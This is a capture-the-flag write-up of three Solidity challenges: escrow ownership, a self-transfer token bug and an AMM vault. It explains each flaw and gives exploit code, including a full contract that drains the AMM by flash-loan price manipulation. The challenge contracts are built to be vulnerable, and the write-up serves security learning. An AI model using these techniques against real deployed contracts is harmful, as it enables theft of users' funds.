---
title: NusgreyhatsCTF_Solutions
date: 2024-04-23 17:49:19
tags:
---
## Escrow

### Description
---

Introducing NFT-based escrows - you can deposit assets and trade escrows by selling your ownership NFT! However, I accidentally renounced ownership for my own escrow. Can you help me recover the funds?

### Goal
---
```
grey.balanceOf(address(escrow)) == 0 && grey.balanceOf(msg.sender) >= 10_000e18;
```
### Code
---
DualAssetEscrow.sol:

- This is an escrow contract for holding two types of assets (tokenX and tokenY).
- The contract uses the Clone library to deploy new instances of the escrow contract through cloning.
- The contract has an initialize function to initialize the escrow and check the validity of the passed arguments.
- The owner function returns the current owner of the escrow contract, which is the address holding the EscrowFactory NFT.

EscrowFactory.sol:

- This is an escrow factory contract for deploying and managing DualAssetEscrow contracts.
- The contract inherits the ERC721 standard to represent ownership of the escrow contracts.
- The addImplementation function is used to add implementations of the escrow contract and can only be called by the owner of the factory contract.
- The deployEscrow function is used to deploy new escrow contracts and mint an ERC721 token to represent ownership of the escrow contract.
- The renounceOwnership function is used to permanently renounce ownership of an escrow contract.

Setup.sol:

- This is a contract for setting up the challenge and checking the completion of the challenge.
- In the constructor, the contract deploys the GREY token contract, the EscrowFactory contract, and an instance of the DualAssetEscrow contract.
- The contract deposits 10,000 GREY into the escrow contract and then renounces ownership of the escrow contract.



### Solution
---

Owner goal is to Drain the escrow contract, we can see we drop the ownership of escrow, so we need to be the owner then we can drain the funds.

In `DualAssetEscrow::withdraw()` the check is use `(msg.sender != owner())` not the actual address.

So we just need to fake the escrowId, get the same escrowId `0`, then we can attack successfully.

First we need to pass the `deployEscrow()`，we can find that `address public constant ETH_ADDRESS = address(0);`, so if can fake the escrowId by `(grey,bytes19(abi.encodePacked(address(0)));)`

than we can pass `if (deployedParams[paramsHash]) revert AlreadyDeployed();`

### Exp
---
[Github]()(will push it later)

## Greyhats Dollar
---

### Description
---

Worried about inflation? Introducing GreyHats Dollar (GHD), the world's first currency with deflation built-in! Backed by GREY tokens, GHD will automatically deflate at a rate of 3% every year.

### Goal
---

```
ghd.balanceOf(msg.sender) >= 50_000e18;
```

### Solution
---

Just the self transfer issue, we just need to transfer to ourselves, until our balance reached 50000e18.

### Exp
---

```
while (balance < 50_000e18) {
            setup.ghd().transfer(address(this), balance);
            balance = setup.ghd().balanceOf(address(this));
        }
```

## Simple Amm Vault

### Description
---

ERC-4626 was too complex, so I made an AMM to swap between shares and assets

### Goal
---

```
grey.balanceOf(msg.sender) >= 3000e18;
```

### Code
---

SimpleAMM.sol:
- Simple AMM, Take SV and Grey Token
- Price From Vault by sharePrice()
- swap() have the modifier invariant

SetUp.sol:
- Create AMM and Vault
- deposit 1000e18 GREY to Vault and distribute 1000e18 GREY
- claim() function give msg.sender 1000e18 GREY

SimpleVault.sol:
- deposit GREY and get SV



### Solution
---

From setup, we can see that there are 2000e18 assets in Vault, but only 1000e18 SV was minted.

If we want to swap in AMM, we need to pass the invariant, but now the price is 2000:1000 = 2
the k is set to 3000, but the reserveX and reserveY only 1000e18, so first we need to change the price by using flashloan in amm.

that's the answer:
1. flashloan 1000e18 SV
2. burn and get 2000e18 GREY back
3. deposit 1000e18 GREY to vault, make the price to 1
4. call swap() to drain all GREY in amm.

### Exp
---

```solidity
contract Exploit {
    Setup setup;

    constructor(address _setup) {
        setup = Setup(_setup);
    }

    function solve() external {
        // Claim 1000 GREY
        setup.claim();

        // Flash loan 1000 SV from the AMM
        setup.amm().flashLoan(true, 1000e18, "");

        // Drain 1000 GREY from the AMM
        setup.amm().swap(true, 0, 1000e18);

        // Transfer all GREY to msg.sender
        setup.grey().transfer(msg.sender, setup.grey().balanceOf(address(this)));
    }

    function onFlashLoan(uint256 svAmount, bytes calldata) external {
        // Burn 1000 SV for 2000 GREY
        setup.vault().withdraw(svAmount);

        // Deposit 1000 GREY for 1000 SV. Share price is now 1:1
        setup.grey().approve(address(setup.vault()), 1000e18);
        setup.vault().deposit(1000e18);

        // Approve SV for AMM to return the flash loan
        setup.vault().approve(address(setup.amm()), svAmount);
    }
}
```
